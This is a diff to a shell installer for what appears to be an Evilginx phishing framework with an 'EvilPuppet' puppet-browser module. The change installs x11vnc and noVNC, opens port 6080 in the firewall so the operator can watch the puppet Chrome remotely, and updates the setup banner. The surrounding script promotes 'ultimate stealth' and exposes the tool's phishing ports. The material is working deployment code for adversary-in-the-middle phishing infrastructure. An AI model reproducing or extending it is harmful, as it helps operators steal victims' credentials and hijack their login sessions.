@@ -278,6 +278,8 @@ apt-get install -y -qq \
     gnupg \
     unzip \
     xvfb \
+    x11vnc \
+    novnc \
     > /dev/null 2>&1
 info "Base packages installed"
 
@@ -286,6 +288,18 @@ if command -v Xvfb &>/dev/null; then
     info "Xvfb installed — Chrome will run in non-headless mode (ultimate stealth)"
 else
     warn "Xvfb not found — Chrome will fall back to --headless=new mode"
+fi
+
+# Verify VNC tools for remote browser viewing
+if command -v x11vnc &>/dev/null; then
+    info "x11vnc installed — puppet browser viewable via VNC"
+else
+    warn "x11vnc not found"
+fi
+if command -v websockify &>/dev/null; then
+    info "noVNC/websockify installed — puppet browser viewable in web browser"
+else
+    warn "noVNC not found — install with: apt install novnc"
 fi
 
 # ─── Step 2: Install Go (if not present or too old) ─────────────────
@@ -419,9 +433,10 @@ if command -v ufw &>/dev/null && ufw status | grep -q "active"; then
     ufw allow 80/tcp   >/dev/null 2>&1 && info "   80/tcp (HTTP) opened"
     ufw allow 53/udp   >/dev/null 2>&1 && info "   53/udp (DNS) opened"
     ufw allow 7777/tcp >/dev/null 2>&1 && info " 7777/tcp (EvilPuppet) opened"
+    ufw allow 6080/tcp >/dev/null 2>&1 && info " 6080/tcp (noVNC browser viewer) opened"
 elif command -v iptables &>/dev/null; then
     info "Opening ports via iptables..."
-    for port_proto in "443:tcp" "80:tcp" "53:udp" "7777:tcp"; do
+    for port_proto in "443:tcp" "80:tcp" "53:udp" "7777:tcp" "6080:tcp"; do
         port="${port_proto%%:*}"
         proto="${port_proto##*:}"
         if ! iptables -C INPUT -p "$proto" --dport "$port" -j ACCEPT 2>/dev/null; then
@@ -494,6 +509,7 @@ echo -e "    ${CYAN}: puppet list${NC}                              # see active
 echo ""
 echo -e "  ${BOLD}Important:${NC}"
 echo -e "    • Puppet web UI listens on port ${YELLOW}7777${NC} (auto-generated password shown at startup)"
+echo -e "    • noVNC browser viewer on port ${YELLOW}6080${NC} (watch the puppet Chrome in your browser)"
 echo -e "    • EvilPuppet uses Chromium at: ${YELLOW}$(command -v chromium 2>/dev/null || command -v chromium-browser 2>/dev/null || echo '/usr/bin/chromium')${NC}"
 echo -e "    • Config stored in ${YELLOW}~/.evilginx/${NC}"
 echo ""
